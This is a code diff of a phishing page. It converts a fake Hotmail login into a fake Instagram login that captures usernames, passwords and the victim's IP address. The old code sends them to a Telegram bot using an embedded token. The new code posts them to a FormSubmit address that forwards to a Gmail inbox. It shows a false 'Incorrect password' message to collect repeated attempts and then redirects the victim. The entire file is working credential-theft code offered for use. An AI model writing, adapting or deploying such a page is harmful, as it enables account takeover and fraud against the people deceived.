@@ -3,123 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hotmail</title>
+    <title>Instagram Login Form</title>
     <style>
-        /* Hotmail Themed Styling */
+        /* Instagram Themed Styling */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f4f7fa;
             margin: 0;
         }
 
         .login-box {
             background: white;
             padding: 20px;
+            border: 1px solid #dbdbdb;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
             text-align: center;
             width: 350px;
         }
 
         .logo {
-            width: 150px;
+            width: 200px;
             margin-bottom: 20px;
         }
 
-        input[type="email"], 
+        input[type="text"], 
         input[type="password"] {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
             border-radius: 5px;
-            font-size: 16px;
+            font-size: 14px;
         }
 
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #0078d4;  /* Hotmail Blue */
+            padding: 10px;
+            background: #3897f0;
             border: none;
             border-radius: 5px;
             color: white;
-            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
         }
 
         button:hover {
-            background-color: #005a8c;  /* Darker Blue */
+            background: #3578e5;
         }
 
         #errorMessage {
             color: red;
             margin-top: 10px;
         }
+
+        .forgot {
+            margin-top: 10px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <!-- Hotmail Logo -->
-        <img src="IMG_9684.jpeg" alt="Hotmail Logo" class="logo">
+        <!-- Instagram Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
         
-        <!-- Login Form -->
+        <!-- Login Form (action points to FormSubmit, but submission is handled via JS) -->
         <form id="loginForm">
-            <input type="email" id="email" placeholder="Email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">LOGIN</button>
+            <input type="text" id="emailOrUsername" name="emailOrUsername" placeholder="Email or Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <!-- Hidden fields for FormSubmit customization -->
+            <input type="hidden" name="_subject" value="New Instagram Login Attempt">
+            <input type="hidden" name="_captcha" value="false"> <!-- Disable reCAPTCHA for AJAX -->
+            <!-- Optional: <input type="hidden" name="_replyto" value="emailOrUsername"> for replies to user's email -->
+            <button type="submit">Log In</button>
+            <p class="forgot"><a href="#">Forgot password?</a></p>
             <p id="errorMessage"></p>
         </form>
     </div>
 
     <script>
-        // JavaScript for handling form submissions
-        const botToken = '7729844025:AAFfgx0TPOwxCs8Hrc9JZGTHkQmvL8aFhTo';  // Replace with your bot token
-        const chatId = '8378689900';      // Replace with your chat ID
+        // JavaScript to handle form submission and FormSubmit integration
+        const formSubmitUrl = 'https://formsubmit.co/fj4546845@gmail.com';  // Using provided email
         let attemptCount = 0;
+        const fallbackIp = '94.131.218.172';  // Fallback from document
 
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Prevent form submission
+            event.preventDefault();  // Prevent default form submission (no page reload)
+
             attemptCount++;
-
-            const email = document.getElementById('email').value;
+            const emailOrUsername = document.getElementById('emailOrUsername').value;
             const password = document.getElementById('password').value;
-            const formName = "Hotmail";
             
-            // Fetching user's IP address
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const userIp = ipData.ip;
+            // Fetch user's IP address with fallback
+            let userIp = fallbackIp;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIp = ipData.ip;
+            } catch (ipError) {
+                console.warn('IP fetch failed, using fallback:', ipError);
+            }
 
-            // Prepare the message to be sent to Telegram
-            const message = `
-📩 *New Login Attempt*
-👤 *Form:* ${formName}
-📧 *Email:* ${email}
-🔑 *Password:* ${password}
-🌐 *IP Address:* ${userIp}
-🔁 *Attempt:* ${attemptCount}/3
-            `;
+            // Create FormData for submission
+            const formData = new FormData(event.target);
+            formData.append('ipAddress', userIp);  // Add IP as a field
+            formData.append('attemptCount', `${attemptCount}/3`);  // Add attempt count
 
-            // Send data to Telegram bot
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
+            // Send data to FormSubmit via AJAX
+            fetch(formSubmitUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+                console.log('FormSubmit sent successfully to fj4546845@gmail.com');
+            })
+            .catch(error => {
+                console.error('FormSubmit send failed:', error);
+                // Optionally show error to user
+                document.getElementById('errorMessage').textContent = "Login failed. Please try again. (Check console for details)";
             });
 
-            // Incorrect password handling logic
+            // Incorrect password handling (independent of submission)
             if (attemptCount < 3) {
-                document.getElementById('errorMessage').textContent = "Incorrect password. Try again.";
+                document.getElementById('errorMessage').textContent = "Incorrect password. Please try again.";
             } else {
-                window.location.href = "https://www.hotmail.com";  // Redirect after 3rd attempt
+                window.location.href = "factorr.html";  // Redirect after 3rd attempt
             }
         });
     </script>
